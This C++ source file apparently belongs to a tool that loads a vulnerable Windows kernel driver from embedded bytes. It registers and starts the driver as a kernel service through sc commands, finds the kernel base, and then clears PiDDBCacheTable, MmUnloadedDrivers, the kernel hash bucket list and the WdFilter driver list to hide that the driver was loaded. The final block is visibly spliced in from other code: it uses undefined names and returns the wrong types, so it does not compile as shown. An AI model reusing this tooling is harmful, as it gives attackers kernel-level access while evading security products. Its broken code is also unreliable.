#include "vulndriver.h"
#include "utils.h"


NTSTATUS VulnurableService::UnloadVulnurableDriver(HANDLE* VulnHandle, char VulnDriverPath[], const char* ServiceName) {
	if (*VulnHandle != 0 && *VulnHandle != INVALID_HANDLE_VALUE) {
		CloseHandle(*VulnHandle);
	}
	const char* ReplaceArr[2] = { ServiceName, VulnDriverPath };
	const char* SymbolsArr = "~`";
	const char* RegisterCommand[3] = { "sc stop ~", "sc delete ~", "del /s /q `"};

	if (!general::PerformCommand(RegisterCommand, ReplaceArr, SymbolsArr, 3, 2)) {
		return STATUS_UNSUCCESSFUL;
	}

	return STATUS_SUCCESS;
}


NTSTATUS VulnurableService::RegisterVulnurableDriver(char VulnDriverPath[], const char* ServiceName) {
	const char* ReplaceArr[2] = { ServiceName, VulnDriverPath };
	const char* SymbolsArr = "`~";
	const char* RegisterCommand[1] = { "sc create ` type=kernel start=demand binPath=~" };

	if (!general::PerformCommand(RegisterCommand, ReplaceArr, SymbolsArr, 1, 2)) {
		return STATUS_UNSUCCESSFUL;
	}
	return STATUS_SUCCESS;
}


NTSTATUS VulnurableService::StartVulnurableDriver(const char* ServiceName) {
	const char* ReplaceArr[1] = { ServiceName };
	const char* SymbolsArr = "~";
	const char* StartCommand[1] = { "sc start ~" };

	if (!general::PerformCommand(StartCommand, ReplaceArr, SymbolsArr, 1, 1)) {
		return STATUS_UNSUCCESSFUL;
	}
	return STATUS_SUCCESS;
}


NTSTATUS VulnurableDriver::LoadVulnurableDriver(HANDLE* VulnHandle, LPCWSTR VulnDriverName, const char* SymbolicLink, const char* ServiceName, const BYTE DriverData[]) {
	DWORD Status = 0;
	char VulnDriverPath[MAX_PATH] = { 0 };
	WCHAR WideVulnDriverPath[MAX_PATH] = { 0 };
	PVOID KernelBaseAddress = NULL;
	std::wstring BackSlash(L"\\");
	std::wstring VulnName(BackSlash + VulnDriverName);

	general::GetCurrentPathRegular(VulnDriverPath, VulnName);
	general::CharpToWcharp(VulnDriverPath, WideVulnDriverPath);
	if (VulnurableDriver::HelperFunctions::IsAlreadyRunning(SymbolicLink)) {
		return ERROR_ALREADY_EXISTS;
	}
	wprintf(L"[i] Loading vulnurable driver %s from full path %s\n", VulnDriverName, WideVulnDriverPath);


	// Get the vulnurable driver in a file from the memory data:
	Status = specific::MemoryToFile(VulnDriverName, (BYTE*)DriverData, sizeof(DriverData));
	if (Status != 0) {
		wprintf(L"[-] Failed to load vulnurable driver data into a file (%s): %d\n", VulnDriverName, Status);
		return Status;
	}

	
	// Register the vulnurable driver as a service and start the service:
	if (VulnurableService::RegisterVulnurableDriver(VulnDriverPath, ServiceName) == STATUS_UNSUCCESSFUL) {
		printf("[-] Failed to register the vulnurable driver as a service: %d\n", GetLastError());
		return STATUS_UNSUCCESSFUL;
	}
	if (VulnurableService::StartVulnurableDriver(ServiceName) == STATUS_UNSUCCESSFUL) {
		printf("[-] Failed to start the vulnurable driver service: %d\n", GetLastError());
		return STATUS_UNSUCCESSFUL;
	}
	

	// Check if driver was loaded correctly by trying to get a handle with the symbolic link:
	*VulnHandle = CreateFileA(SymbolicLink, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (*VulnHandle == NULL || *VulnHandle == INVALID_HANDLE_VALUE){
		printf("[-] Failed to load vulnurable driver (handle = NULL/INVALID_HANDLE_VALUE): %d\n", GetLastError());
		VulnurableService::UnloadVulnurableDriver(VulnHandle, VulnDriverPath, ServiceName);
		return STATUS_UNSUCCESSFUL;
	}


	// Get base of kernel:
	KernelBaseAddress = specific::GetKernelModuleAddress("ntoskrnl.exe");
	if (KernelBaseAddress == NULL) {
		printf("[-] Failed to get the base address of the kernel system module (ntoskrnl.exe): %d\n", GetLastError());
		VulnurableService::UnloadVulnurableDriver(VulnHandle, VulnDriverPath, ServiceName);
		return STATUS_UNSUCCESSFUL;
	}

	if (!intel_driver::ClearPiDDBCacheTable(result)) {
		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearKernelHashBucketList(result)) {
		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearMmUnloadedDrivers(result)) {
		Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearWdFilterDriverList(result)) {
		Log("[!] Failed to ClearWdFilterDriverList" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	return STATUS_SUCCESS;
}